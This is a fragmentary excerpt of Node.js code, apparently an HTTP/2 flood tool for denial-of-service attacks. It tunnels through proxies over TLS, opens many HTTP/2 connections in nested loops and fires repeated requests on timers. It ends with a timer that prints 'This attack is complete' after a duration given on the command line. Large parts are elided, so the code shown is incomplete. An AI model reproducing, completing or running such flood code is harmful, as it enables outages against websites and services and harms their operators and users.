    ...
    http2TUNNEL(socket) {
        ...
        const tunnel = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                ...
                // Loop the request multiple times per interval
                for (let i = 0; i < 12; i++) {
                    setInterval(async () => {
                        try {
                            const response = await tunnel.request(payload);
...
function Runner() {
    for (let i = 0; i < 120; i++) {
        ...
        req.on('connect', (_, socket) => {
            console.log('Proxy connected, initializing TLS tunnel...');
...
setTimeout(function () {
    console.log('This attack is complete');
    process.exit();
}, process.argv[3] * 1000);
